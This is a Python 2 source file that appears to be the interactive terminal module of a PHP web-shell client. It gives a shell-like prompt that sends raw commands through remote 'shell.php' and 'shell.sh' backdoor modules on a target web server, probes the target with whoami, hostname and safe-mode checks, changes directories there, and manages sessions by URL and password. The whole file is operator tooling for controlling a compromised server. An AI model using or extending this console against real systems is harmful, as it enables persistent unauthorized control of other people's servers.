'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleexception import ModuleException
from core.vector import Vector
from core.helper import Helper
from core.sessions import cfgfilepath, historyfilepath
import os, re, shlex, atexit, sys


try:
    import readline
except ImportError:
    try:
        import pyreadline as readline
    except ImportError: 
        print '[!] Error, readline or pyreadline python module required. In Ubuntu linux run\n[!] sudo apt-get install python-readline'
        sys.exit(1)



module_trigger = ':'
help_string = ':help'
set_string = ':set'
load_string = ':load'
gen_string = ':generator'
session_string = ':session'


class Terminal(Helper):

    def __init__( self, modhandler):
        
        self.modhandler = modhandler

        self._init_completion()
        self._load_rcfile(self.modhandler.sessions.get_session()['global']['rcfile'])
        
        # Register methods to dump files at exit
        atexit.register( readline.write_history_file, os.path.join(cfgfilepath, historyfilepath))
        atexit.register( modhandler.sessions.dump_all_sessions, modhandler.modules)

        
    def loop(self):

        self._tprint(self._format_presentation())
        
        username, hostname = self.__env_init()

        self.__cwd_handler()
        
        while self.modhandler.interpreter:

            prompt = '{user}@{host}:{path} {prompt} '.format(
                                                             user=username, 
                                                             host=hostname, 
                                                             path=getattr(self.modhandler.load('shell.php').stored_args_namespace, 'path'), 
                                                             prompt = 'PHP>' if (self.modhandler.interpreter == 'shell.php') else '$' )

			# Python 3 doesn't support raw_input(), it uses a 'new' input()
            try:
                input_cmd = raw_input( prompt )

            except NameError:
				input_cmd = input( prompt )

            if input_cmd and (input_cmd[0] == ':' or input_cmd[:2] in ('ls', 'cd')):
                # This is a module call, pre-split to simulate argv list to pass to argparse 
                try:
                    cmd = shlex.split(input_cmd)
                except ValueError:
                    self._tprint('[terminal] [!] Error: command parse fail%s' % os.linesep)
                    continue
                
            elif input_cmd and input_cmd[0] != '#':
                # This is a direct command, do not split
                cmd = [ input_cmd ] 
            else:
                continue
            
            self.run_cmd_line(cmd)


    def _tprint(self, msg):
        self.modhandler._last_warns += msg + os.linesep
        if msg: print msg,
        

    def run_cmd_line(self, command):

        self._last_output = ''
        self.modhandler._last_warns = ''
        self._last_result = None
        
        
        try:
    
            ## Help call
            if command[0] == help_string:
                if len(command) == 2:
                    command[1] = command[1].lstrip(':')
                    if command[1] in self.modhandler.modules_classes.keys():
                        self._tprint(self._format_helps([ command[1] ]))
                    else:
                        self._tprint(self._format_helps([ m for m in self.modhandler.modules_classes.keys() if command[1] in m], summary_type=1))                        
                else:
                    self._tprint(self._format_grouped_helps())
                           
            ## Set call if ":set module" or ":set module param value"
            elif command[0] == set_string and len(command) > 1: 
                    self.modhandler.load(command[1]).store_args(command[2:])
                    self._tprint(self.modhandler.load(command[1]).format_stored_args() + os.linesep)

            ## Load call
            elif command[0] == load_string and len(command) == 2:
                # Recursively call run_cmd_line() and return to avoid to reprint last output
                self._load_rcfile(command[1])
                return

            ## Handle cd call
            elif command[0] == 'cd':
                self.__cwd_handler(command)
                
            ## Handle session management
            elif command[0] == session_string:
                if len(command) >= 3 and command[1].startswith('http'):
                    self.modhandler.sessions.load_session(command[1], command[2], None)
                    self.modhandler.set_url_pwd()
                elif len(command) >= 2:
                    self.modhandler.sessions.load_session(None, None, command[1])
                    self.modhandler.set_url_pwd()
                else:
                    self._tprint(self.modhandler.sessions.format_sessions(2))
            else:
                    
                ## Module call
                if command[0][0] == module_trigger:
                    interpreter = command[0][1:]
                    cmd = command[1:]
                ## Raw command call. Command is re-joined to be considered as single command
                else:
                    # If interpreter is not set yet, try to probe automatically best one
                    if not self.modhandler.interpreter:
                        self.__guess_best_interpreter()
                    
                    interpreter = self.modhandler.interpreter
                    cmd = [ ' '.join(command) ] 
                
                res, out = self.modhandler.load(interpreter).run(cmd)

                if out != '': self._last_output += out
                if res != None: self._last_result = res
                
        except KeyboardInterrupt:
            self._tprint('[!] Stopped execution%s' % os.linesep)
        except ModuleException, e:
            self._tprint('[%s] [!] Error: %s%s' % (e.module, e.error, os.linesep))

        
        if self._last_output:
            print self._last_output
        

    def __guess_best_interpreter(self):
        
        # Run an empty command on shell.sh, to trigger first probe and load correct vector
        
        self.modhandler.load('shell.php').run(' ')

        if self.modhandler.load('shell.php').stored_args_namespace['mode']:
            self.modhandler.interpreter = 'shell.php'
            self.modhandler.load('shell.sh').run(' ')
            if self.modhandler.load('shell.sh').stored_args_namespace['vector']:
                self.modhandler.interpreter = 'shell.sh'
            
        if not self.modhandler.interpreter:
            raise ModuleException('terminal','Interpreter guess failed')
            
    def _load_rcfile(self, path):
        
        if not path:
            return
        
        path = os.path.expanduser(path)

        try:
            rcfile = open(path, 'r')
        except Exception, e:
            self._tprint( "[!] Error opening '%s' file." % path)
            return
            
        last_output = ''
        last_warns = ''
        last_result = []
        
        for cmd in [c.strip() for c in rcfile.read().split('\n') if c.strip() and c[0] != '#']:
            self._tprint('[LOAD] %s%s' % (cmd, os.linesep))
            self.run_cmd_line(shlex.split(cmd))
            
            last_output += self._last_output 
            last_warns += self.modhandler._last_warns 
            last_result.append(self._last_result)
        
        if last_output: self._last_output = last_output
        if last_warns: self.modhandler._last_warns = last_warns
        if last_result: self._last_result = last_result
        

    def __cwd_handler (self, cmd = None):

        cwd_new = ''
        
        if cmd == None or len(cmd) ==1:
            cwd_new = Vector(self.modhandler,  'first_cwd', 'system.info', 'cwd').execute()
        elif len(cmd) == 2:
            cwd_new = Vector(self.modhandler,  'getcwd', 'shell.php', 'chdir("$path") && print(getcwd());').execute({ 'path' : cmd[1] })
            if not cwd_new:
                self._tprint("[!] Folder '%s' change failed, no such file or directory or permission denied%s" % (cmd[1], os.linesep))                
                return
            
        if cwd_new:
            self.modhandler.load('shell.php').stored_args_namespace['path'] = cwd_new
        

    def __env_init(self):
        
        # At terminal start, try to probe automatically best interpreter
        self.__guess_best_interpreter()
        
        username =  Vector(self.modhandler, "whoami", 'system.info', "whoami").execute()
        hostname =  Vector(self.modhandler, "hostname", 'system.info', "hostname").execute()
        
        if Vector(self.modhandler, "safe_mode", 'system.info', "safe_mode").execute() == '1':
            self._tprint('[!] PHP Safe mode enabled%s' % os.linesep)

        
        return username, hostname
    


    def _init_completion(self):


            self.matching_words =  [':%s' % m for m in self.modhandler.modules_classes.keys()] + [help_string, load_string, set_string, session_string]
        
            try:
                readline.set_history_length(100)
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind( 'tab: complete' )
                readline.set_completer( self._complete )
                readline.read_history_file( os.path.join(cfgfilepath, historyfilepath))

            except IOError:
                pass
            



    def _complete(self, text, state):
        """Generic readline completion entry point."""

        try:
            buffer = readline.get_line_buffer()
            line = readline.get_line_buffer().split()

            if ' ' in buffer:
                return []

            # show all commandspath
            if not line:
                all_cmnds = [c + ' ' for c in self.matching_words]
                if len(all_cmnds) > state:
                    return all_cmnds[state]
                else:
                    return []


            cmd = line[0].strip()

            if cmd in self.matching_words:
                return [cmd + ' '][state]

            results = [c + ' ' for c in self.matching_words if c.startswith(cmd)] + [None]
            if len(results) == 2:
                if results[state]:
                    return results[state].split()[0] + ' '
                else:
                    return []
            return results[state]

        except Exception, e:
            self._tprint('[!] Completion error: %s' % e)


